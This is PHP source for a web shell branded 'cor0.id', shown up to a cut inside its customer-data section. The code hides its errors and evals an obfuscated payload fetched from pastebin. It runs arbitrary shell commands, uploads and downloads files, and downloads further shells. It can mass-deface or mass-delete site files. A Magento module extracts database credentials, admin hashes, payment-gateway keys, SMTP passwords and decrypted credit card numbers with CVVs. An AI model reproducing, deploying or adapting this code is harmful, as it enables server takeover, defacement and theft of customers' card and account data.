<?php
@session_start(); 
@error_reporting(0); 
@error_log(0);
@ini_set('error_log',NULL); 
@ini_set('log_errors',0); 
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0); 
@ini_set('display_errors', 0);
@set_time_limit(0); 
@set_magic_quotes_runtime(0);
$lol="4f382dd4000f9b60bbc9f2fc5158240b"; //password(md5)
function printLogin() { 
    ?> 
<html>
<head>
<title>Not Pound</title>
 rel='icon' type='image/x-icon'/>
<meta name='author' content='cor0.id'>
<meta charset="UTF-8">
<style>
<body bgcolor="black"
</style>
<style type='text/css'>
@import url(https://fonts.googleapis.com/css?family=Abel);
html {
	background: #000000;
	color:black;
	font-family: 'Abel';
	font-size: 13px;
	width: 100%;
}
input[type=text], input[type=password],input[type=submit] {
	background: #00000; 
	color: black; 
	border: 1px solid #ffffff; 
	margin: 5px auto;
	padding-left: 5px;
	font-family: 'Abel';
	font-size: 13px;
}

</style>

</head>	
</style>
    <pre align="center"> 
    </pre>
  </style>
    <pre align="center"> 
<pre style="text-align: centre; color: lime; font-size: 13px;"> 
<pre>
  _..__.          .__.._
.^"-.._ '-(\__/)-' _..-"^.
'-.' oo '.-' 
			  `-..-'                           
</pre>
<font color="white" face="courier new">cor0.id<br><font color="cyan" face="courier new"> 
___________________________
< root@coro.id whuttt??? >
---------------------------
Obsidian Cyber Team
    <style> 
        input { margin:0;border:1px solid #ffffff; } 
    </style> 
    <center>  
    <form method=post> 
    <input type=password name=jancox> 
    </form></center> 
    <?php 
	eval(gzinflate(base64_decode(file_get_contents('http://pastebin.com/raw/6PJ9Pj8F'))));
    exit; 
} 
if( !isset( $_SESSION[md5($_SERVER['HTTP_HOST'])] )) 
    if( empty( $lol ) || 
        ( isset( $_POST['jancox'] ) && ( md5($_POST['jancox']) == $lol ) ) ) 
        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true; 
    else 
        printLogin();
if(isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['act'] == 'download')) {
	@ob_clean();
	$file = $_GET['file'];
	header('Content-Description: File Transfer');
	header('Content-Type: application/octet-stream');
	header('Content-Disposition: attachment; filename="'.basename($file).'"');
	header('Expires: 0');
	header('Cache-Control: must-revalidate');
	header('Pragma: public');
	header('Content-Length: ' . filesize($file));
	readfile($file);
	exit;
} 	
	
?>
<html>
<head>
<title>cor0.id</title>
<meta name='author' content='IndoXploit'>
<meta charset="UTF-8">
<style type='text/css'>
@import url(https://fonts.googleapis.com/css?family=Abel);
html {
	color: blue;
	font-family: 'Abel';
	font-size: 13px;
	width: 100%;
}
li {
	display: inline;
	margin: 5px;
	padding: 5px;
}
table, th, td {
	border-collapse:collapse;
	font-family: Tahoma, Geneva, sans-serif;
	font-family: 'Abel';
	font-size: 13px;
}
body {
    background-repeat: no-repeat;
    background-attachment: fixed;
    background-position: center; 
}
.table_home, .th_home, .td_home {
	border: 1px solid #ffffff;
}
th {
	padding: 10px;
}
a {
	color: white;
	text-decoration: none;
}
a:hover {
	color: red;
	text-decoration: underline;
}
b {
	color: green;
}
input[type=text], input[type=password],input[type=submit] {
	background: black; 
	color: azure; 
	border: 1px solid #ffffff; 
	margin: 5px auto;
	padding-left: 5px;
	font-family: 'Abel';
	font-size: 13px;
}
textarea {
	border: 1px solid #ffffff;
	width: 100%;
	height: 400px;
	padding-left: 5px;
	margin: 10px auto;
	resize: none;
	background: black;
	color: white;
	font-family: 'Abel';
	font-size: 13px;
}
select {
	background: grey; 
	color: white 
	border: 1px solid #ffffff; 
	margin: 5px auto;
	padding-left: 5px;
	font-family: 'Abel';
	font-size: 13px;
}
.but {
	background: black; 
	color: red; 
	border: 1px solid #ffffff; 
	margin: 5px auto;
	padding-left: 5px;
	font-family: 'Abel';
	font-size: 13px;

}
</style>
<body bgcolor="black"
</head>
<?php
if (file_exists("php.ini")){
}else{
$img = fopen('php.ini', 'w');
$sec = "safe_mode = OFF
disable_funtions = NONE";
fwrite($img ,$sec);
fclose($img);}		
function w($dir,$perm) {
	if(!is_writable($dir)) {
		return "<font color=red>".$perm."</font>";
	} else {
		return "<font color=lime>".$perm."</font>";
	}
}
    function UrlLoop($url,$type){

        $urlArray = array();

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $result = curl_exec($ch);

        $regex='|<a.*?href="(.*?)"|';
        preg_match_all($regex,$result,$parts);
        $links=$parts[1];
        foreach($links as $link){
            array_push($urlArray, $link);
        }
        curl_close($ch);

        foreach($urlArray as $value){
            $lol="$url$value";
			if(preg_match("#$type#is", $lol)) {
				echo "$lol\r\n";
			}
        }
    }
function exe($cmd) { 	
if(function_exists('system')) { 		
		@ob_start(); 		
		@system($cmd); 		
		$buff = @ob_get_contents(); 		
		@ob_end_clean(); 		
		return $buff; 	
	} elseif(function_exists('exec')) { 		
		@exec($cmd,$results); 		
		$buff = ""; 		
		foreach($results as $result) { 			
			$buff .= $result; 		
		} return $buff; 	
	} elseif(function_exists('passthru')) { 		
		@ob_start(); 		
		@passthru($cmd); 		
		$buff = @ob_get_contents(); 		
		@ob_end_clean(); 		
		return $buff; 	
	} elseif(function_exists('shell_exec')) { 		
		$buff = @shell_exec($cmd); 		
		return $buff; 	
	} 
}
function perms($file){
$perms = fileperms($file);
if (($perms & 0xC000) == 0xC000) {
$info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
$info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
$info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
$info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
$info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
$info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
$info = 'p';
} else {
$info = 'u';
}
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
(($perms & 0x0800) ? 's' : 'x' ) :
(($perms & 0x0800) ? 'S' : '-'));
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
(($perms & 0x0400) ? 's' : 'x' ) :
(($perms & 0x0400) ? 'S' : '-'));
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
(($perms & 0x0200) ? 't' : 'x' ) :
(($perms & 0x0200) ? 'T' : '-'));
return $info;
}
function hdd($s) {
if($s >= 1073741824)
return sprintf('%1.2f',$s / 1073741824 ).' GB';
elseif($s >= 1048576)
return sprintf('%1.2f',$s / 1048576 ) .' MB';
elseif($s >= 1024)
return sprintf('%1.2f',$s / 1024 ) .' KB';
else
return $s .' B';
}
function ambilKata($param, $kata1, $kata2){
    if(strpos($param, $kata1) === FALSE) return FALSE;
    if(strpos($param, $kata2) === FALSE) return FALSE;
    $start = strpos($param, $kata1) + strlen($kata1);
    $end = strpos($param, $kata2, $start);
    $return = substr($param, $start, $end - $start);
    return $return;
}
if(get_magic_quotes_gpc()) {
	function idx_ss($array) {
		return is_array($array) ? array_map('idx_ss', $array) : stripslashes($array);
	}
	$_POST = idx_ss($_POST);
}
function CreateTools($names,$lokasi){
	if ( $_GET['create'] == $names ){
		$a= "".$_SERVER['SERVER_NAME']."";
$b= dirname($_SERVER['PHP_SELF']);
$c = "/coro.id/".$names.".php";
if (file_exists('coro.id/'.$names.'.php')){
	echo '<script type="text/javascript">alert("Done");window.location.href = "coro.id/'.$names.'.php";</script> ';
	}
	else {mkdir("coro.id", 0777);
file_put_contents('coro.id/'.$names.'.php', file_get_contents($lokasi));
echo ' <script type="text/javascript">alert("Done");window.location.href = "coro.id/'.$names.'.php";</script> ';}}}

CreateTools("wso","http://pastebin.com/raw/3eh3Gej2");
CreateTools("adminer"."https://www.adminer.org/static/download/4.2.5/adminer-4.2.5.php");
CreateTools("b374k","http://pastebin.com/raw/rZiyaRGV");
CreateTools("injection","http://pastebin.com/raw/nxxL8c1f");
CreateTools("promailerv2","http://pastebin.com/raw/Rk9v6eSq");
CreateTools("gamestopceker","http://pastebin.com/raw/QSnw1JXV");
CreateTools("bukapalapak","http://pastebin.com/raw/6CB8krDi");
CreateTools("tokopedia","http://pastebin.com/dvhzWgby");
CreateTools("encodedecode","http://pastebin.com/raw/wqB3G5eZ");
CreateTools("mailer","http://pastebin.com/raw/9yu1DmJj");
CreateTools("r57","http://pastebin.com/raw/G2VEDunW");
CreateTools("tokenpp","http://pastebin.com/raw/72xgmtPL");
CreateTools("extractor","http://pastebin.com/raw/jQnMFHBL");
CreateTools("bh","http://pastebin.com/raw/3L2ESWeu");
CreateTools("dhanus","http://pastebin.com/raw/v4xGus6X");
if(isset($_GET['dir'])) {
	$dir = $_GET['dir'];
	chdir($_GET['dir']);
} else {
	$dir = getcwd();
}
$dir = str_replace("\\","/",$dir);
$scdir = explode("/", $dir);
$sm = (@ini_get(strtolower("safe_mode")) == 'on') ? "<font color=red>ON</font>" : "<font color=lime>OFF</font>";
$ling="http://".$_SERVER['SERVER_NAME']."" .$_SERVER['PHP_SELF']."?create";
$ds = @ini_get("disable_functions");
$mysql = (function_exists('mysql_connect')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$curl = (function_exists('curl_version')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$wget = (exe('wget --help')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$perl = (exe('perl --help')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$python = (exe('python --help')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$show_ds = (!empty($ds)) ? "<font color=red>$ds</font>" : "<font color=lime>NONE</font>";
if(!function_exists('posix_getegid')) {
	$user = @get_current_user();
	$uid = @getmyuid();
	$gid = @getmygid();
	$group = "?";
} else {
	$uid = @posix_getpwuid(posix_geteuid());
	$gid = @posix_getgrgid(posix_getegid());
	$user = $uid['name'];
	$uid = $uid['uid'];
	$group = $gid['name'];
	$gid = $gid['gid'];
}
$d0mains = @file("/etc/named.conf");
			$users=@file('/etc/passwd');
        if($d0mains)
        { 
			$count;  
			foreach($d0mains as $d0main)
			{
				if(@ereg("zone",$d0main))
				{
					preg_match_all('#zone "(.*)"#', $d0main, $domains);
					flush();
					if(strlen(trim($domains[1][0])) > 2)
					{
						flush();
						$count++;
			   		} 
			   	}
			}
		}

$sport=$_SERVER['SERVER_PORT'];
echo "<table style='width:100%'>";
echo "<tr><td>System: <font color=lime>".php_uname()."</font></td></tr>";
echo "<tr><td>User: <font color=lime>".$user."</font> (".$uid.") Group: <font color=lime>".$group."</font> (".$gid.")</td></tr>";
echo "<tr><td>Server IP: <font color=lime>".gethostbyname($_SERVER['HTTP_HOST'])."</font> | Your IP: <font color=lime>".$_SERVER['REMOTE_ADDR']."</font></td></tr>";
echo "<tr><td>HDD: <font color=lime>".hdd(disk_free_space("/"))."</font> / <font color=lime>".hdd(disk_total_space("/"))."</font></td></tr>";
echo "<tr><td>Websites :<font color=lime> $count </font> Domains</td></tr>";
echo "<tr><td>Port :<font color=lime>  $sport</font> </td></tr>";
echo "<tr><td>Safe Mode: $sm</td></tr>";
echo "<tr><td>Disable Functions: $show_ds</td></tr>";

echo "<tr><td>MySQL: $mysql | Perl: $perl | Python: $python | WGET: $wget | CURL: $curl </td></tr>";
echo "<tr><td>Current DIR: ";
foreach($scdir as $c_dir => $cdir) {	
	echo "<a href='?dir=";
	for($i = 0; $i <= $c_dir; $i++) {
		echo $scdir[$i];
		if($i != $c_dir) {
		echo "/";
		}
	}
	echo "'>$cdir</a>/";
}
echo "<tr><td><form method='post' action='?dir=$dir&do=cmd'>
	Command : 
	<input type='text' size='30' height='10' name='cmd'><input type='submit' name='do_cmd' value='>>'>
	</form></td></tr>";
echo "</table><hr>";
echo "<center>";
echo "<ul>";
echo "<li>[ <a href='?'>Home</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=upload'>Upload</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=cmd'>Command</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=mass_deface'>Mass Deface</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=config'>Config</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=symconfig'>Config 2</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=jumping'>jumping</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=symlink'>Symlink</a> ]<br></li>";
echo "<li>[ <a href='?dir=$dir&do=cpanel'>CPanel Crack</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=cpftp_auto'>CPanel/FTP Auto Deface</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=smtp'>SMTP Grabber</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=zoneh'>Zone-H</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=defacerid'>Defacer.ID</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=cgi'>CGI Telnet</a> ]</li><br>";
echo "<li>[ <a href='?dir=$dir&do=adminer'>Adminer</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=fake_root'>Fake Root</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=auto_edit_user'>Auto Edit User</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=auto_wp'>Auto Edit Title WordPress</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=auto_dwp'>WordPress Auto Deface</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=auto_dwp2'>WordPress Auto Deface V.2</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=auto_cu_wp'>WordPress Auto Edit User V.2</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=auto_cu_joomla'>Joomla Auto Edit User V.2</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=passwbypass'>Bypass etc/passw</a> ]<br></li>";
echo "<li>[ <a href='?dir=$dir&do=loghunter'>Log Hunter</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=shellchk'>Shell Checker</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=shelscan'>Shell Finder</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=zip'>Zip Menu</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=injectcode'>Code Inject</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=about'>About</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=magen'>Magento DB Info</a> ]</li><br>";
echo "<li>[ <a href='?dir=$dir&do=metu'>LogOut</a> ]<br></li>";
echo "</ul>";
echo "</center>";
echo "<hr>";
if($_GET['do'] == 'upload') {
	echo "<center>";
	if($_POST['upload']) {
		if(@copy($_FILES['ix_file']['tmp_name'], "$dir/".$_FILES['ix_file']['name']."")) {
			$act = "<font color=lime>Berhasil Horee!</font> at <i><b>$dir/".$_FILES['ix_file']['name']."</b></i>";
		} else {
			$act = "<font color=red>Yahh Gagal</font>";
		}
	}
	echo "Upload File: [ ".w($dir,"Writeable")." ]<form method='post' enctype='multipart/form-data'><input type='file' name='ix_file'><input type='submit' value='upload' name='upload'></form>";
	echo $act;
	echo "</center>";
} 
 elseif($_GET['do'] == 'cmd') {
	if($_POST['do_cmd']) {
		echo "<pre>".exe($_POST['cmd'])."</pre>";
	}
} elseif($_GET['do'] == 'mass_deface') {
	echo "<center><form action=\"\" method=\"post\">\n";
	$dirr=$_POST['d_dir'];
	$index = $_POST["script"];
	$index = str_replace('"',"'",$index);
	$index = stripslashes($index);
	function edit_file($file,$index){
		if (is_writable($file)) {
		clear_fill($file,$index);
		echo "<Span style='color:green;'><strong> [+] Nyabun 100% Successfull </strong></span><br></center>";
		} 
		else {
			echo "<Span style='color:red;'><strong> [-] Ternyata Tidak Boleh Menyabun Disini :( </strong></span><br></center>";
			}
			}
	function hapus_massal($dir,$namafile) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$lokasi = $dirc.'/'.$namafile;
				if($dirb === '.') {
					if(file_exists("$dir/$namafile")) {
						unlink("$dir/$namafile");
					}
				} elseif($dirb === '..') {
					if(file_exists("".dirname($dir)."/$namafile")) {
						unlink("".dirname($dir)."/$namafile");
					}
				} else {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							if(file_exists($lokasi)) {
								echo "[<font color=lime>DELETED</font>] $lokasi<br>";
								unlink($lokasi);
								$idx = hapus_massal($dirc,$namafile);
							}
						}
					}
				}
			}
		}
	}
	function clear_fill($file,$index){
		if(file_exists($file)){
			$handle = fopen($file,'w');
			fwrite($handle,'');
			fwrite($handle,$index);
			fclose($handle);  } }

	function gass(){
		global $dirr , $index ;
		chdir($dirr);
		$me = str_replace(dirname(__FILE__).'/','',__FILE__);
		$files = scandir($dirr) ;
		$notallow = array(".htaccess","error_log","_vti_inf.html","_private","_vti_bin","_vti_cnf","_vti_log","_vti_pvt","_vti_txt","cgi-bin",".contactemail",".cpanel",".fantasticodata",".htpasswds",".lastlogin","access-logs","cpbackup-exclude-used-by-backup.conf",".cgi_auth",".disk_usage",".statspwd","..",".");
		sort($files);
		$n = 0 ;
		foreach ($files as $file){
			if ( $file != $me && is_dir($file) != 1 && !in_array($file, $notallow) ) {
				echo "<center><Span style='color: #8A8A8A;'><strong>$dirr/</span>$file</strong> ====> ";
				edit_file($file,$index);
				flush();
				$n = $n +1 ;
				} 
				}
				echo "<br>";
				echo "<center><br><h3>$n Kali Anda Telah Ngecrot  Disini </h3></center><br>";
					}
	function ListFiles($dirrall) {

    if($dh = opendir($dirrall)) {

       $files = Array();
       $inner_files = Array();
       $me = str_replace(dirname(__FILE__).'/','',__FILE__);
       $notallow = array($me,".htaccess","error_log","_vti_inf.html","_private","_vti_bin","_vti_cnf","_vti_log","_vti_pvt","_vti_txt","cgi-bin",".contactemail",".cpanel",".fantasticodata",".htpasswds",".lastlogin","access-logs","cpbackup-exclude-used-by-backup.conf",".cgi_auth",".disk_usage",".statspwd","Thumbs.db");
        while($file = readdir($dh)) {
            if($file != "." && $file != ".." && $file[0] != '.' && !in_array($file, $notallow) ) {
                if(is_dir($dirrall . "/" . $file)) {
                    $inner_files = ListFiles($dirrall . "/" . $file);
                    if(is_array($inner_files)) $files = array_merge($files, $inner_files);
                } else {
                    array_push($files, $dirrall . "/" . $file);
                }
            }
			}

			closedir($dh);
			return $files;
		}
	}
	function gass_all(){
		global $index ;
		$dirrall=$_POST['d_dir'];
		foreach (ListFiles($dirrall) as $key=>$file){
			$file = str_replace('//',"/",$file);
			echo "<center><strong>$file</strong> ===>";
			edit_file($file,$index);
			flush();
		}
		$key = $key+1;
	echo "<center><br><h3>$key Kali Anda Telah Ngecrot  Disini  </h3></center><br>"; }
	function sabun_massal($dir,$namafile,$isi_script) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$lokasi = $dirc.'/'.$namafile;
				if($dirb === '.') {
					file_put_contents($lokasi, $isi_script);
				} elseif($dirb === '..') {
					file_put_contents($lokasi, $isi_script);
				} else {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							echo "[<font color=lime>Berhasil</font>] $lokasi<br>";
							file_put_contents($lokasi, $isi_script);
							$idx = sabun_massal($dirc,$namafile,$isi_script);
						}
					}
				}
			}
		}
	}
	if($_POST['mass'] == 'onedir') {
		echo "<br> Versi Text Area<br><textarea style='background:black;outline:none;color:red;' name='index' rows='10' cols='67'>\n";
		$ini="http://";
		$mainpath=$_POST[d_dir];
		$file=$_POST[d_file];
		$dir=opendir("$mainpath");
		$code=base64_encode($_POST[script]);
		$indx=base64_decode($code);
		while($row=readdir($dir)){
		$start=@fopen("$row/$file","w+");
		$finish=@fwrite($start,$indx);
		if ($finish){
			echo"$ini$row/$file\n";
			}
		}
		echo "</textarea><br><br><br><b>Versi Text</b><br><br><br>\n";
		$mainpath=$_POST[d_dir];$file=$_POST[d_file];
		$dir=opendir("$mainpath");
		$code=base64_encode($_POST[script]);
		$indx=base64_decode($code);
		while($row=readdir($dir)){$start=@fopen("$row/$file","w+");
		$finish=@fwrite($start,$indx);
		if ($finish){echo '<a href="http://' . $row . '/' . $file . '" target="_blank">http://' . $row . '/' . $file . '</a><br>'; }
		}

	}
	elseif($_POST['mass'] == 'sabunkabeh') { gass(); }
	elseif($_POST['mass'] == 'hapusmassal') { hapus_massal($_POST['d_dir'], $_POST['d_file']); }
	elseif($_POST['mass'] == 'sabunmematikan') { gass_all(); }
	elseif($_POST['mass'] == 'massdeface') {
		echo "<div style='margin: 5px auto; padding: 5px'>";
		sabun_massal($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
		echo "</div>";	}
	else {
		echo "
		<center><font style='text-decoration: underline;'>
		Select Type:<br>
		</font>
		<select class=\"select\" name=\"mass\"  style=\"width: 450px;\" height=\"10\">
		<option value=\"onedir\">Mass Deface 1 Dir</option>
		<option value=\"massdeface\">Mass Deface ALL Dir</option>
		<option value=\"sabunkabeh\">Sabun Massal Di Tempat</option>
		<option value=\"sabunmematikan\">Sabun Massal Bunuh Diri</option>
		<option value=\"hapusmassal\">Mass Delete Files</option></center></select><br>
		<font style='text-decoration: underline;'>Folder:</font><br>
		<input type='text' name='d_dir' value='$dir' style='width: 450px;' height='10'><br>
		<font style='text-decoration: underline;'>Filename:</font><br>
		<input type='text' name='d_file' value='coro.php' style='width: 450px;' height='10'><br>
		<font style='text-decoration: underline;'>Index File:</font><br>
		<textarea name='script' style='width: 450px; height: 200px;'>pwnd By coro.id</textarea><br>
		<input type='submit' name='start' value='Mass Deface' style='width: 450px;'>
		</form></center>";
		}
	}
elseif($_GET['do'] == 'magen') {
echo'
<div id="page-wrap">  
<center>  
<br>  
<FORM action=""  method="post">  
<div align="center">[M A G E N T O] - Stealing Information<br>  
<div align="center">coder: sohai & n4KuLa_<br>  
<input type="hidden" name="form_action" value="2">  
</div>  
</div>  
';  


if(file_exists($_SERVER['DOCUMENT_ROOT'].'/app/etc/local.xml')){  
    $xml = simplexml_load_file($_SERVER['DOCUMENT_ROOT'].'/app/etc/local.xml');  
    if(isset($xml->global->resources->default_setup->connection)) {  
       $connection = $xml->global->resources->default_setup->connection;  
       $prefix = $xml->global->resources->db->table_prefix;  
       $key = $xml->global->crypt->key; //f8cd1881e3bf20108d5f4947e60acfc1  
       require_once $_SERVER['DOCUMENT_ROOT'].'/app/Mage.php';  
         
       try {  
           $app = Mage::app('default');  
           Mage::getSingleton('core/session', array('name'=>'frontend'));  
       }catch(Exception $e) { echo 'Message: ' .$e->getMessage()."<br/>\n";}  

       if (!mysql_connect($connection->host, $connection->username, $connection->password)){  
           print("Could not connect: " . mysql_error());  
       }  
       mysql_select_db($connection->dbname);  
       echo $connection->host."|".$connection->username."|".$connection->password."|".$connection->dbname."| $prefix | $key<br/>\n";  

    $crypto = new Varien_Crypt_Mcrypt();  
    $crypto->init($key);  

    //=========================================================================================================  
    $query = mysql_query("SELECT user_id,firstname,lastname,email,username,password FROM admin_user where is_active = '1'");  
    if (!$query){  
          echo "<center><b>YAH GAGAL</b></center>";  
    }else{  
            $site = mysql_fetch_array(mysql_query("SELECT value as website FROM core_config_data WHERE path='web/unsecure/base_url'"));  
          echo'<br><br>  
                ====================================================================<br>  
                                [ Admin FROM website : '.$site['website'].'] <br>  
                ====================================================================<br>';  
    }  
    echo "  
    <table border='1' align='center' >  
    <tr>  
    <td>id</td>  
    <td>firstname</td>  
    <td>lastname</td>  
    <td>email</td>  
    <td>username</td>  
    <td>password</td>   
    </tr>";  
        while($vx = mysql_fetch_array($query)) {  
        $no = 1;  
        $user_id = $vx['user_id'];  
        $username = $vx['username'];  
        $password = $vx['password'];  
        $email = $vx['email'];  
        $firstname = $vx['firstname'];  
        $lastname = $vx['lastname'];  
        echo "<tr><pre><td>$user_id</td><td>$firstname</td><td>$lastname</td><td>$email</td><td>$username</td><td>$password</td></pre></tr>";  
        }   
    echo "</table><br>";  
    //=========================================================================================================  
    $query = mysql_query("SELECT value as user,(SELECT value FROM core_config_data where  path = 'payment/authorizenet/trans_key') as pass FROM core_config_data where path = 'payment/authorizenet/login'");  
    if(mysql_num_rows($query) != 0){  
        if (!$query){  
              echo "<center><b>Yah Gagal</b></center>";  
        }else{  
              echo'<br><br>  
                    ====================================================================<br>  
                                    [ Authorizenet ] <br>  
                    ====================================================================<br>';  
        }  
        echo "  
        <table border='1' align='center' >  
        <tr>  
        <td>no</td>  
        <td>user</td>  
        <td>pass</td>      
        </tr>";  
            $no = 1;  
            while($vx = mysql_fetch_array($query)) {  
            $user = $crypto->decrypt($vx['user']);  
            $pass = $crypto->decrypt($vx['pass']);  

              
            echo "<tr><pre><td>$no</td><td>$user</td><td>$pass</td></pre></tr>";  
            $no++;  
            }   
        echo "</table><br>";  
    }  
    //=========================================================================================================  
    $query_smtp = mysql_query("SELECT (SELECT a.value FROM core_config_data as a WHERE path = 'system/smtpsettings/host') as host , (SELECT b.value FROM core_config_data as b WHERE path = 'system/smtpsettings/port') as port,(SELECT c.value FROM core_config_data as c WHERE path = 'system/smtpsettings/username') as user ,(SELECT d.value FROM core_config_data as d WHERE path = 'system/smtpsettings/password') as pass FROM core_config_data limit 1,1");  
    if(mysql_num_rows($query_smtp) != 0){  
        if (!$query_smtp){  
              echo "<center><b>Yah Gagal</b></center>";  
        }else{  
              echo'<br><br>  
                    ====================================================================<br>  
                                    [ SMTP ] <br>  
                    ====================================================================<br>';  
        }  
        echo "  
        <table border='1' align='center' >  
        <tr>  
        <td>no</td>  
        <td>host</td>          
        <td>port</td>  
        <td>user</td>  
        <td>pass</td>      
        </tr>";  
            $no = 1;  
            $batas = 0;  
            while($rows = mysql_fetch_array($query_smtp)) {  
                $smtphost = $rows[0];  
                $smtpport = $rows[1];  
                $smtpuser = $rows[2];  
                $smtppass = $rows[3];  
                echo "<tr><pre><td>$no</td><td>$smtphost</td><td>$smtpport</td><td>$smtpuser</td><td>$smtppass</td></pre></tr>";  
                $no++;  
            }  
        echo "</table><br>";  
    }  
    //=========================================================================================================  
    $query = mysql_query("SELECT sfo.updated_at,sfo.cc_owner,sfo.method,sfo.cc_number_enc,sfo.cc_cid_enc,CONCAT(sfo.cc_exp_month,' |',sfo.cc_exp_year) as exp,CONCAT(billing.firstname,' | ',billing.lastname,' | ',billing.street,' | ',billing.city,' | ', billing.region,' | ',billing.postcode,' | ',billing.country_id,' | ',billing.telephone,' |-| ',billing.email) AS 'Billing Address' FROM sales_flat_quote_payment AS sfo JOIN sales_flat_quote_address AS billing ON billing.quote_id = sfo.quote_id AND billing.address_type = 'billing'");  
    $query2 = mysql_query("SELECT sfo.cc_owner,sfo.method,sfo.cc_number_enc,sfo.cc_cid_status,CONCAT(sfo.cc_exp_month,'|',sfo.cc_exp_year) as exp,CONCAT(billing.firstname,' | ',billing.lastname,' | ',billing.street,' | ',billing.city,' | ', billing.region,' | ',billing.postcode,' | ',billing.country_id,' | ',billing.telephone,' | ',billing.email) AS 'Billing Address' FROM sales_flat_order_payment AS sfo JOIN sales_flat_order_address AS billing ON billing.parent_id = sfo.parent_id AND billing.address_type = 'billing' where cc_number_enc != ''");
    if(mysql_num_rows($query) != 0 || mysql_num_rows($query2) != 0){  
          echo'<br><br>  
                ====================================================================<br>  
                                [ Credit Card ] <br>  
                ====================================================================<br>';  
            echo "  
            <table border='1' align='left' >  
            <tr>  
            <td>no</td>  
            <td>Date</td>  
            <td>Credit Owner</td>  
            <td>method</td>  
            <td>Credit Number</td>  
            <td>Credit Exp</td>  
            <td>CVV</td>  
            <td>Address</td>  
            </tr>";  
                $no = 1;  
                $batas = 0;  
                while($vx = mysql_fetch_array($query)){  
                $date = $vx['updated_at'];  
                $cc_owner = $vx['cc_owner'];  
                $method = $vx['method'];  
                $cc_number_enc = $crypto->decrypt($vx['cc_number_enc']);  
                $exp = $vx['exp'];          
                $cc_cid_enc = $crypto->decrypt($vx['cc_cid_enc']);      
                $Billing_Address = $vx['Billing Address'];  
                echo "<tr><pre><td>$no</td><td>$date</td><td>$cc_owner</td><td>$method</td><td>$cc_number_enc</td><td>$exp</td><td>$cc_cid_enc</td><td>$Billing_Address</td></pre></tr>";  
                $batas = $no++;  
                }  
                  
                while($vx2 = mysql_fetch_array($query2)){  
                    $batas +=1;  
                $cc_owner = $vx2['cc_owner'];  
                $method = $vx2['method'];  
                $cc_number_enc = $crypto->decrypt($vx2['cc_number_enc']);  
                $exp = $vx2['exp'];          
                $cc_cid_status = $crypto->decrypt($vx2['cc_cid_status']);  
                $Billing_Address = $vx2['Billing Address'];  
                echo "<tr><pre><td>$batas</td><td>$cc_owner</td><td>$method</td><td>$cc_number_enc</td><td>$exp</td><td>$cc_cid_status</td><td>$Billing_Address</td></pre></tr>";  
                 $batas++;  
                }       
                  
            echo "</table><br>";      
    }  
    //=========================================================================================================  
    $query = mysql_query("SELECT email,value FROM customer_entity_varchar, customer_entity WHERE customer_entity_varchar.entity_id = customer_entity.entity_id and attribute_id=12");  
    $query2 = mysql_query("SELECT customer_email,password_hash FROM sales_flat_quote");  
      
      
    if(mysql_num_rows($query) != 0 || mysql_num_rows($query2) != 0 ){  
        if (!$query){  
              echo "<center><b>Yah Gagal</b></center>";  
        }else{  
              echo'<br><br>  
                    ====================================================================<br>  
                                    [ Customer ] <br>  
                    ====================================================================<br>';  
        }  
        echo "  
        <table border='1' align='center' >  
        <tr>  
        <td>no</td>  
        <td>user</td>  
        <td>pass</td>      
        </tr>";  
            $no = 1;  
            $batas = 0;  
            while($vx = mysql_fetch_array($query)) {  
                $user = $vx['email'];  
                $pass = $vx['value'];  
